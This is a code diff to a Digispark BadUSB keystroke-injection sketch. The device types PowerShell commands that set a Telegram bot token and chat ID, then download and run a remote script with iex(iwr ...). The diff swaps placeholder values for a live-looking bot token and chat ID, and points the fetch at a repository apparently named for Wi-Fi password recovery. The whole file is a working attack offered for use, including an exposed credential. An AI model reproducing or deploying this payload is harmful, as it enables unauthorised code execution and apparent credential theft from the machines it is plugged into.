@@ -8,15 +8,15 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(4000);
 
-  DigiKeyboard.print("$env:TK='PASTE_TOKEN_HERE'");
+  DigiKeyboard.print("$env:TK='8464883369:AAH8am3Lj8inaWk2nFbqC5BC4CsGIZnkJZw'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
-  DigiKeyboard.print("$env:CI='PASTE_CHAT_ID_HERE'");
+  DigiKeyboard.print("$env:CI='5122031226'");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
-  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/Esther7171/Digispark-HID-Toolkit/main/scripts/void.ps1' -UseBasicParsing).Content");
+  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/mrbob101signal-bit/wifipasswordrecover/main/scripts/void.ps1' -UseBasicParsing).Content");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(15000);
 
